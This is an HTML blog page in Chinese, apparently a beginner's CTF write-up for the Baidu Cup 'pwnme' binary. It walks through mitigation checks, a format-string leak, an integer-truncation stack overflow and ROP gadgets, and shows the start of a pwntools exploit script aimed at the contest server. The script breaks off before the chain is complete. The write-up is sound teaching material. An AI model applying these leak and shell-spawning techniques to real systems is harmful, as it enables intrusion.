@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
+
+
+
+
+<title>百度杯11月pwnme | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/blog/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/blog/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/blog/js/script.js"></script>
+    
+    <script src="/blog/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+
+
+
+  <!-- for theme: default is false -->
+  <!-- for page: default is true -->
+
+<link rel="stylesheet" href="/blog/js/fancybox/jquery.fancybox.min.css">
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+	
+		<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/blog/">Home</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/blog/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/blog/archives">Posts</a>
+                
+                    <a class="menu-item" href="/blog/category">Categories</a>
+                
+                    <a class="menu-item" href="/blog/tag">Tags</a>
+                
+                    <a class="menu-item" href="/blog/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+			expand_toc()
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">百度杯11月pwnme</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">一月 16, 2018</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/blog/category/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><img src="/blog/2018/01/16/%E7%99%BE%E5%BA%A6%E6%9D%AF11%E6%9C%88pwnme/13-99-45.jpg"></p>
+<blockquote>
+<p>这算是接触pwntools的第一题吧</p>
+<p>需要很多二进制知识储备，解释得比较适合新手看，大佬绕行</p>
+<p>过程跌跌撞撞，写来纪念一下</p>
+</blockquote>
+<a id="more"></a>
+<h4 id="稍作分析">稍作分析</h4>
+<p>首先拿到题目，丢IDA，发现是 64位 elf文件</p>
+<p><img src="/blog/2018/01/16/%E7%99%BE%E5%BA%A6%E6%9D%AF11%E6%9C%88pwnme/13-32-01.jpg">随意找一下，分析出主程序和主循环</p>
+<p><img src="/blog/2018/01/16/%E7%99%BE%E5%BA%A6%E6%9D%AF11%E6%9C%88pwnme/13-32-40.jpg">大致过程就是先打印欢迎界面
+-&gt; 先注册 -&gt; 然后主循环，三个选项，分别是打印信息、修改信息、退出
+很容易发现打印信息函数存在明显的格式化字符串漏洞</p>
+<p><img src="/blog/2018/01/16/%E7%99%BE%E5%BA%A6%E6%9D%AF11%E6%9C%88pwnme/13-34-54.jpg">直接打印存入的信息，是一个很明显的格式化字符漏洞
+我们可以构造一个比如<code>%11$x</code>
+<code>%11$n</code>的payload去泄露内存，以及修改内存 格式化漏洞详情 <a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro.html">CTF
+Wiki-格式化字符串漏洞</a>
+然后我们用<code>checksec</code>来看一下程序开了那些保护(github上有此脚本)</p>
+<p><img src="/blog/2018/01/16/%E7%99%BE%E5%BA%A6%E6%9D%AF11%E6%9C%88pwnme/13-42-45.jpg"></p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> checksec <span class="at">--file</span> pwnme </span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">RELRO</span>           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY Fortified Fortifiable  FILE</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Full</span> RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No  0       5   pwnme</span></code></pre></div>
+<h4 id="保护机制">保护机制</h4>
+<h5 id="canary栈保护">Canary（栈保护）</h5>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<h5 id="nxdep堆栈不可执行">NX/DEP（堆栈不可执行）</h5>
+<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<h5 id="pieaslr地址随机化">PIE/ASLR（地址随机化）</h5>
+<p>程序和库加载在内存中地址随机化 #### Fortify
+与栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。</p>
+<h5 id="relro">RelRO</h5>
+<p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global
+Offset Table）攻击。</p>
+<h4 id="开始利用">开始利用</h4>
+<p><strong><em>以下内容需要先了解ROP</em></strong><br>
+<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop.html">详情点此处</a></p>
+<p>可以看出
+<code>Full RELRO</code>，并不能修改got表劫持控制流，<code>NX enable</code>也不能执行栈内数据，而且<code>Canary</code>并没用开启。所以有两种思路：一种是利用格式化漏洞泄露<code>system</code>的地址，然后修改栈数据劫持控制流，调用<code>system</code>；另一种是格式化漏洞泄露<code>system</code>地址，然后寻找一个栈溢出漏洞覆盖返回地址劫持控制流
+参考了各位大佬的思路得知，溢出点在修改信息的修改密码时：</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>__int64 __usercall modify@<span class="op">&lt;</span>rax<span class="op">&gt;(</span>__int64 s@<span class="op">&lt;</span>rdi<span class="op">&gt;,</span> __int64 dest@<span class="op">&lt;</span>rdx<span class="op">&gt;,</span> __int64 sa<span class="op">,</span> __int64 a4<span class="op">,</span> __int64 desta<span class="op">,</span> __int64 a6<span class="op">,</span> __int64 a7<span class="op">)</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">&#123;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> v8<span class="op">;</span> <span class="co">// [sp+18h] [bp-18h]@3</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> v9<span class="op">;</span> <span class="co">// [sp+1Fh] [bp-11h]@1</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">void</span> <span class="op">*</span>buf<span class="op">;</span> <span class="co">// [sp+20h] [bp-10h]@1</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">void</span> <span class="op">*</span>src<span class="op">;</span> <span class="co">// [sp+28h] [bp-8h]@1</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>  <span class="co">//申请两个300的堆空间</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>  src <span class="op">=</span> malloc<span class="op">(</span><span class="dv">300</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>  buf <span class="op">=</span> malloc<span class="op">(</span><span class="dv">300</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;please input new username(max lenth:20): &quot;</span><span class="op">);</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>  fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>  v9 <span class="op">=</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> buf<span class="op">,</span> <span class="dv">300</span><span class="bu">uLL</span><span class="op">);</span><span class="co">//从输入读300个字节到buf</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> v9 <span class="op">&lt;=</span> <span class="dv">0</span> <span class="op">||</span> v9 <span class="op">&gt;</span> <span class="dv">20</span> <span class="op">)</span><span class="co">//判断长度，超过20则退出</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#123;</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;len error(max lenth:20)!try again..&quot;</span><span class="op">);</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>    fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a>    <span class="op">*(</span>_QWORD <span class="op">*)</span>s <span class="op">=</span> sa<span class="op">;</span><span class="co">//应该是个结构体，退出时修改会原来的值</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">8</span><span class="op">)</span> <span class="op">=</span> a4<span class="op">;</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a>    <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">16</span><span class="op">)</span> <span class="op">=</span> desta<span class="op">;</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">24</span><span class="op">)</span> <span class="op">=</span> a6<span class="op">;</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">32</span><span class="op">)</span> <span class="op">=</span> a7<span class="op">;</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#125;</span></span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span></span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#123;</span></span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(&amp;</span>sa<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">20</span><span class="bu">uLL</span><span class="op">);</span><span class="co">//名字部分，20字节置0</span></span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a>    strcpy<span class="op">((</span><span class="dt">char</span> <span class="op">*)&amp;</span>sa<span class="op">,</span> <span class="op">(</span><span class="dt">const</span> <span class="dt">char</span> <span class="op">*)</span>buf<span class="op">);</span><span class="co">//字符串拷贝过去，遇0终止</span></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;please input new password(max lenth:20): &quot;</span><span class="op">);</span></span>
+<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a>    fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb2-30"><a href="#cb2-30" aria-hidden="true" tabindex="-1"></a>    v8 <span class="op">=</span> read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> src<span class="op">,</span> <span class="dv">300</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb2-31"><a href="#cb2-31" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">(</span>_BYTE<span class="op">)</span>v8 <span class="op">&amp;&amp;</span> <span class="op">(</span><span class="dt">unsigned</span> __int8<span class="op">)</span>v8 <span class="op">&lt;=</span> <span class="dv">20</span><span class="bu">u</span> <span class="op">)</span><span class="co">//问题出在这，输入的长度被类型转换了，由int转成btye，当输入的长度为0x(n*100)至0x(n*100)+0x20都能绕过(n&gt;=1),形成栈溢出</span></span>
+<span id="cb2-32"><a href="#cb2-32" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
+<span id="cb2-33"><a href="#cb2-33" aria-hidden="true" tabindex="-1"></a>      memset<span class="op">((</span><span class="dt">char</span> <span class="op">*)&amp;</span>desta <span class="op">+</span> <span class="dv">4</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">20</span><span class="bu">uLL</span><span class="op">);</span></span>
+<span id="cb2-34"><a href="#cb2-34" aria-hidden="true" tabindex="-1"></a>      sub_400A90<span class="op">(</span>src<span class="op">,</span> v8<span class="op">);</span></span>
+<span id="cb2-35"><a href="#cb2-35" aria-hidden="true" tabindex="-1"></a>      memcpy<span class="op">((</span><span class="dt">char</span> <span class="op">*)&amp;</span>desta <span class="op">+</span> <span class="dv">4</span><span class="op">,</span> src<span class="op">,</span> v8<span class="op">);</span><span class="co">//用memcpy拷贝，不会遇到0停止</span></span>
+<span id="cb2-36"><a href="#cb2-36" aria-hidden="true" tabindex="-1"></a>      fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb2-37"><a href="#cb2-37" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)</span>s <span class="op">=</span> sa<span class="op">;</span></span>
+<span id="cb2-38"><a href="#cb2-38" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">8</span><span class="op">)</span> <span class="op">=</span> a4<span class="op">;</span></span>
+<span id="cb2-39"><a href="#cb2-39" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">16</span><span class="op">)</span> <span class="op">=</span> desta<span class="op">;</span></span>
+<span id="cb2-40"><a href="#cb2-40" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">24</span><span class="op">)</span> <span class="op">=</span> a6<span class="op">;</span></span>
+<span id="cb2-41"><a href="#cb2-41" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">32</span><span class="op">)</span> <span class="op">=</span> a7<span class="op">;</span></span>
+<span id="cb2-42"><a href="#cb2-42" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
+<span id="cb2-43"><a href="#cb2-43" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span></span>
+<span id="cb2-44"><a href="#cb2-44" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#123;</span></span>
+<span id="cb2-45"><a href="#cb2-45" aria-hidden="true" tabindex="-1"></a>      puts<span class="op">(</span><span class="st">&quot;len error(max lenth:20)!try again..&quot;</span><span class="op">);</span></span>
+<span id="cb2-46"><a href="#cb2-46" aria-hidden="true" tabindex="-1"></a>      fflush<span class="op">(</span>stdout<span class="op">);</span></span>
+<span id="cb2-47"><a href="#cb2-47" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)</span>s <span class="op">=</span> sa<span class="op">;</span></span>
+<span id="cb2-48"><a href="#cb2-48" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">8</span><span class="op">)</span> <span class="op">=</span> a4<span class="op">;</span></span>
+<span id="cb2-49"><a href="#cb2-49" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">16</span><span class="op">)</span> <span class="op">=</span> desta<span class="op">;</span></span>
+<span id="cb2-50"><a href="#cb2-50" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">24</span><span class="op">)</span> <span class="op">=</span> a6<span class="op">;</span></span>
+<span id="cb2-51"><a href="#cb2-51" aria-hidden="true" tabindex="-1"></a>      <span class="op">*(</span>_QWORD <span class="op">*)(</span>s <span class="op">+</span> <span class="dv">32</span><span class="op">)</span> <span class="op">=</span> a7<span class="op">;</span></span>
+<span id="cb2-52"><a href="#cb2-52" aria-hidden="true" tabindex="-1"></a>    <span class="op">&#125;</span></span>
+<span id="cb2-53"><a href="#cb2-53" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#125;</span></span>
+<span id="cb2-54"><a href="#cb2-54" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> s<span class="op">;</span></span>
+<span id="cb2-55"><a href="#cb2-55" aria-hidden="true" tabindex="-1"></a><span class="op">&#125;</span></span></code></pre></div>
+<p>如上代码分析，我们已经找到一个泄露点和一个溢出点，接下来就需要找到<code>gadget</code>，意思是找到相应的代码，然后跳到此处利用。
+找<code>gadget</code>需要一些技巧以及经验(这也是我缺少的。。。)
+首先我们得了解linux x64是怎么传参的
+它不同于x86的栈传参，它是优先6个寄存器传参，依次是<code>RDI</code>,<code>RSI</code>,<code>RDX</code>,<code>RCX</code>,<code>R8</code>,<code>R9</code>，然后多余的参数才传进栈内
+我的思路是先leak到<code>system</code>的位置，再寻找适当的<code>gadget</code>将栈上参数pop进寄存器然后再调用<code>read</code>函数将<code>/bin/sh</code>写到<code>.bss</code>段，然后再劫持控制流到<code>pop rdi;ret</code>来起<code>shell</code>
+找<code>gadget</code>的工具有很多，简单的<code>objdump</code>和<code>IDA</code>查找也是可以的，也可以用一些工具
+工具链接如下：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/packz/ropeme">ROPEME -
+https://github.com/packz/ropeme</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sashs/Ropper">Ropper -
+https://github.com/sashs/Ropper</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget/tree/master">ROPgadget
+- https://github.com/JonathanSalwan/ROPgadget/tree/master</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0vercl0k/rp">rp++ -
+https://github.com/0vercl0k/rp</a></p>
+<p>来寻找适合的<code>gadget</code>
+我找到的是第一个<code>0x400ECB - pop_4_ret gadget</code>
+和第二个<code>0x400EB0 - mov_call gadget</code>
+以及最后一个<code>0x400ed3 - pop_rdi_ret gadget</code></p>
+<pre class="armasm"><code>.text:00400EB0      mov     rdx, r13    ;第二个gadget
+.text:00400EB3      mov     rsi, r14
+.text:00400EB6      mov     edi, r15d
+.text:00400EB9      call    qword ptr [r12+rbx*8]
+.text:00400EBD      add     rbx, 1
+.text:00400EC1      cmp     rbx, rbp
+.text:00400EC4      jnz     short loc_400EB0
+
+.text:00400EC6      add     rsp, 8
+.text:00400ECA      pop     rbx
+.text:00400ECB      pop     rbp ;第一个gadget
+.text:00400ECC      pop     r12
+.text:00400ECE      pop     r13
+.text:00400ED0      pop     r14
+.text:00400ED2      pop     r15
+.text:00400ED4      retn
+
+；pop_ret gadget
+0x00400ed3 : pop rdi ; ret
+</code></pre>
+<p>第一和第二个链各个配对的<code>gadget</code>是IDA找到的,<code>pop_ret</code>是ROPgadget脚本找到的
+回顾一下思路</p>
+<blockquote>
+<ol type="1">
+<li><p>先leak到<code>system</code>的位置</p></li>
+<li><p>寻找适当的<code>gadget</code>将栈上参数pop进寄存器然后再调用<code>read</code>函数将<code>/bin/sh</code>写到<code>.bss</code>段</p></li>
+<li><p>然后再劫持控制流到<code>pop rdi;ret</code>来起<code>shell</code></p></li>
+</ol>
+</blockquote>
+<p><code>.bss</code>具有可写可读的性质故将<code>/bin/sh</code>写在这段上
+段地址可以通过<code>readelf</code>确定</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> readelf <span class="at">-S</span> pwnme </span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">There</span> are 27 section headers, starting at offset 0x2128:</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Section</span> Headers:</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[Nr]</span> Name     Type       Address           Offset Size  EntSize          Flags  Link  Info  Align</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">....</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[24]</span> .bss    NOBITS    0000000000602010    00002010 0000000000000020  0000000000000000  WA       0     0     16</span></code></pre></div>
+<p>得到<code>.bss</code>地址是<code>0x602010</code>
+然后我们回到第一步，泄露<code>system</code>的地址。
+我利用的是<code>pwntool</code>里面带的<code>DynElf</code>来寻找<code>system</code>在内存中的地址，其实就是利用格式化字符串漏洞泄露内存，然后它执行一个遍历找到目标地址</p>
+<p><strong><em>以下内容需要了解 Pwntool
+DynElf</em></strong>（很多资料，多谷歌吧） 利用代码如下：</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">#coding:utf-8</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&#39;./pwnme&#39;)</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&#39;106.75.66.195&#39;</span>, <span class="dv">13002</span>)<span class="co">#连接端口</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):<span class="co">#学大佬的一个姿势，看起来还不错。作用就是等接收到特定字符再发送想要发送到payload</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> loop(address):<span class="co">#就是给DynElf用的一个函数，用来输入一个地址，得到一个内存地址内容返回，以遍历出目标地址</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>    respone(<span class="st">&#39;&gt;&#39;</span>,<span class="st">&#39;2&#39;</span>)</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>    respone(<span class="st">&#39;please input new username(max lenth:20): </span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="st">&#39;%11$sflag&#39;</span>)<span class="co">#payload是11是因为我们写入的参数就在第十一个参数的地方，看不懂的话请回到格式化漏洞。当然你也可以直接写到下面的password写成%12$s</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>    respone(<span class="st">&#39;please input new password(max lenth:20): </span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="st">&#39;ABCD&#39;</span><span class="op">+</span>p64(address))<span class="co">#填充了四个字节之后才是栈内第十一个参数</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>    respone(<span class="st">&#39;&gt;&#39;</span>,<span class="st">&#39;1&#39;</span>)</span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>    data <span class="op">=</span> pro.recvuntil(<span class="st">&#39;flag&#39;</span>)[:<span class="op">-</span><span class="dv">4</span>]</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> data <span class="op">==</span> <span class="st">&quot;&quot;</span>:</span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>        data <span class="op">=</span> <span class="st">&quot;</span><span class="ch">\x00</span><span class="st">&quot;</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>    <span class="co">#print data,&quot;add=&gt;&quot;,p64(address)</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> data</span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a><span class="co">#一开始注册的两句话，随便填</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&#39;Input your username(max lenth:40): </span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="st">&#39;123&#39;</span>)</span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&#39;Input your password(max lenth:40): </span><span class="ch">\n</span><span class="st">&#39;</span>,<span class="st">&#39;123&#39;</span>)</span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a></span>
